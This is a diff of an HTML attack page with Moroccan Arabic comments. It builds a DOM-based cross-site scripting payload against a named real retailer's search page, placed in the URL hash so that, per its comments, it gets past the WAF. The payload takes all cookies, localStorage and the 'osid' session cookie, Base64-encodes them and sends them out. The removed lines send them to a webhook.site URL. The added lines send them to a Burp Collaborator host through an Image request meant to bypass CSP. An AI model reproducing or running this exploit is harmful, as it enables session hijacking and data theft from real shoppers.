@@ -2,31 +2,35 @@
 <html>
 <body>
     <script>
-        // سكريبت مركز على الـ Shopify Cookies و Session Data
+        // الكود اللي غيتنفذ وسط Decathlon
         let payload = `
             (function(){
                 var data = {
-                    title: "CRITICAL_EXFILTRATION",
-                    url: window.location.href,
-                    // سحب كاع الكوكيز (بما فيها osid و shopify_y)
-                    all_cookies: document.cookie,
-                    // سحب الـ LocalStorage كامل حيت فيه الـ Shopify Tokens
-                    storage: JSON.stringify(localStorage),
-                    // محاولة سحب الـ Email إلا كان باين فـ الـ DOM
-                    email: document.querySelector('.user-info__email')?.innerText || "not_found"
+                    info: "SESS_HIJACK_SUCCESS",
+                    cookies: document.cookie,
+                    ls: JSON.stringify(localStorage),
+                    osid: document.cookie.match(/osid=([^;]+)/)?.[1] || "not_found"
                 };
-                // صيفط الداتا لـ Webhook مشفرة بـ Base64
-                var exfilUrl = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?leak=" + btoa(JSON.stringify(data));
-                fetch(exfilUrl, {mode: 'no-cors'});
+                
+                // الرابط ديال Burp Collaborator ديالك
+                var collab = "zvyhtnk8jyjp14ieruxdawfp9gf731rq.oastify.com";
+                
+                // صيفط الداتا مشفرة بـ Base64
+                var b64Data = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+                
+                // استعملنا Image() حيت كتهرب من الـ CSP أحسن من fetch
+                var exfil = new Image();
+                exfil.src = collab + "/?leak=" + b64Data;
             })();
         `;
 
-        // تحويل الكود لـ URL safe باش يدوز فـ الـ Hash
+        // تشفير الـ Payload باش يدوز فـ الـ Hash
         let encodedPayload = encodeURIComponent(payload);
 
-        // الرابط اللي غيصدمهم (استعملنا # باش نهربو من WAF)
+        // الرابط اللي غيضرب Decathlon عن طريق الـ Hash (#)
         let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encodedPayload + "'))>";
 
+        // تنفيذ التحويل
         window.location.href = finalTarget;
     </script>
 </body>
